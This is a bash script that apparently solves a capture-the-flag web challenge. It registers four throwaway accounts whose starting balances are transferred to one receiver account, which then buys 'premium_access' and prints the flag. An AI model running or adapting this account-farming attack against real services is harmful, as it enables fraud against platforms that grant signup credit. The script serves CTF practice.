#!/usr/bin/env bash
set -euo pipefail

if [ "${1:-}" = "-h" ] || [ "${1:-}" = "--help" ]; then
  printf 'Usage: %s [base_url]\n' "$0"
  printf 'Optional: set WITHDRAW_EVIDENCE_DIR=assets to save HTML/JSON evidence.\n'
  exit 0
fi

base_url="${1:-https://b706ffc72d3e4e61.chal.ctf.ae}"
password="Passw0rd"
stamp="$(date +%s)"
receiver="r${stamp}${RANDOM}"

tmpdir="$(mktemp -d)"
trap 'rm -rf "$tmpdir"' EXIT

receiver_cookie="$tmpdir/receiver.cookie"
register_page="$tmpdir/register.html"
receiver_register="$tmpdir/receiver-register.html"
receiver_dashboard_after="$tmpdir/receiver-dashboard-after.html"
receiver_balance_before="$tmpdir/receiver-balance-before.json"
receiver_balance_after="$tmpdir/receiver-balance-after.json"
store_page="$tmpdir/store.html"
buy_before="$tmpdir/buy-before.json"
buy_after="$tmpdir/buy-after.json"

curl -k -sS "${base_url%/}/register" -o "$register_page"

curl -k -sS -L \
  -c "$receiver_cookie" \
  -b "$receiver_cookie" \
  -d "username=${receiver}&password=${password}" \
  "${base_url%/}/register" \
  -o "$receiver_register"

curl -k -sS \
  -b "$receiver_cookie" \
  "${base_url%/}/balance" \
  -o "$receiver_balance_before"

curl -k -sS \
  -b "$receiver_cookie" \
  -F "item=premium_access" \
  "${base_url%/}/store/buy" \
  -o "$buy_before"

for i in 1 2 3 4; do
  donor="d${stamp}${i}${RANDOM}"
  donor_cookie="$tmpdir/donor-${i}.cookie"
  donor_register="$tmpdir/donor-${i}-register.html"
  donor_transfer="$tmpdir/donor-${i}-transfer.json"

  curl -k -sS -L \
    -c "$donor_cookie" \
    -b "$donor_cookie" \
    -d "username=${donor}&password=${password}" \
    "${base_url%/}/register" \
    -o "$donor_register"

  curl -k -sS \
    -b "$donor_cookie" \
    -F "to_user=${receiver}" \
    -F "amount=100.00" \
    "${base_url%/}/transfer" \
    -o "$donor_transfer"
done

curl -k -sS \
  -b "$receiver_cookie" \
  "${base_url%/}/balance" \
  -o "$receiver_balance_after"

curl -k -sS \
  -b "$receiver_cookie" \
  "${base_url%/}/dashboard" \
  -o "$receiver_dashboard_after"

curl -k -sS \
  -b "$receiver_cookie" \
  "${base_url%/}/store" \
  -o "$store_page"

curl -k -sS \
  -b "$receiver_cookie" \
  -F "item=premium_access" \
  "${base_url%/}/store/buy" \
  -o "$buy_after"

if [ -n "${WITHDRAW_EVIDENCE_DIR:-}" ]; then
  mkdir -p "$WITHDRAW_EVIDENCE_DIR"
  cp "$register_page" "$WITHDRAW_EVIDENCE_DIR/register.html"
  cp "$receiver_register" "$WITHDRAW_EVIDENCE_DIR/receiver-dashboard.html"
  cp "$receiver_dashboard_after" "$WITHDRAW_EVIDENCE_DIR/receiver-dashboard-after.html"
  cp "$receiver_balance_before" "$WITHDRAW_EVIDENCE_DIR/receiver-balance-before.json"
  cp "$receiver_balance_after" "$WITHDRAW_EVIDENCE_DIR/receiver-balance-after.json"
  cp "$store_page" "$WITHDRAW_EVIDENCE_DIR/store.html"
  cp "$buy_before" "$WITHDRAW_EVIDENCE_DIR/buy-before.json"
  cp "$buy_after" "$WITHDRAW_EVIDENCE_DIR/buy-after.json"
fi

flag="$(grep -o 'flag{[^}]*}' "$buy_after" | head -n 1 || true)"
if [ -n "$flag" ]; then
  printf '%s\n' "$flag"
else
  printf 'Could not find flag in final purchase response:\n' >&2
  cat "$buy_after" >&2
  exit 1
fi
